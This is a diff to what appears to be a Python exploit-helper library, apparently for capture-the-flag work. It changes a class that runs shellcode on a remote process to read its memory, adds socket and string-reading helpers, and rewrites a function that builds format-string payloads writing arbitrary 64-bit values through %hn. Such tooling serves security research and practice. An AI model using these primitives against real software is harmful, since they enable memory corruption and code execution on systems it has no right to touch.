@@ -444,10 +444,19 @@ class Remote_x86_64(object):
             mov rdi, {fd_out}
             mov rsi, {addr}
             mov rdx, {sz}
-            mov rax, 0   ; sys_write
+            mov rax, 1   ; sys_write
             syscall
             """.format(addr=addr, sz=sz, fd_out=self.fd_out)))
-        return self.sock.recv(sz)
+        return self.sock.recv(4096)
+
+    def readstr(self, addr):
+        res = ""
+        while True:
+            c = self.read(addr, 1)
+            if c == '\0':
+                return res
+            res += c
+            addr += 1
 
     def write(self, addr, data):
         self.execute(x86_64.assemble("""
@@ -521,6 +530,14 @@ def can_read(s, timeout=0):
 def wait_for_socket(s, timeout=1):
     return can_read(s, timeout)
 
+def read_all(s, sz):
+    buf = ""
+    while len(buf) < sz:
+        d = s.recv(sz - len(buf))
+        assert d
+        buf += d
+    return buf
+
 def read_until(s, f):
     if not callable(f):
         f = lambda x, st=f: st in x
@@ -572,16 +589,18 @@ def make_format(addr, val, offset, dbg=False, bits=64):
     Builds a format string for a word write.
     You have to place addrstr such that %<offset>$p prints addr.
     """
-    struct_fmt = "Q" if bits == 64 else "I"
-    vals = (0,) + struct.unpack("HHHH", struct.pack(struct_fmt, val))
+    assert bits == 64
+    vals = sorted(zip(struct.unpack("HHHH", struct.pack("Q", val)), (0,1,2,3)))
     fmt = addrstr = ""
-    for i in range(0, len(vals) - 1):
-        v = (vals[i+1] - vals[i]) & 0xffff
+    for i in range(len(vals)):
+        diff = vals[i][0] - (vals[i-1][0] if i > 0 else 0)
+        pos = vals[i][1]
+        assert 0 <= diff < 0x10000
         if dbg:
-            fmt += "+{} %{}$p ".format(v, offset+i)
+            fmt += "+{} %{}$p ".format(diff, offset+pos)
         else:
-            if v:
-                fmt += "%{}c".format(v)
-            fmt += "%{}$hn".format(offset+i)
-        addrstr += struct.pack(struct_fmt, addr+2*i)
-    return fmt, addrstr
+            if diff:
+                fmt += "%{}c".format(diff)
+            fmt += "%{}$hn".format(offset+pos)
+        addrstr += struct.pack("Q", addr+2*i)
+    return fmt, addrstr, vals[-1][0]
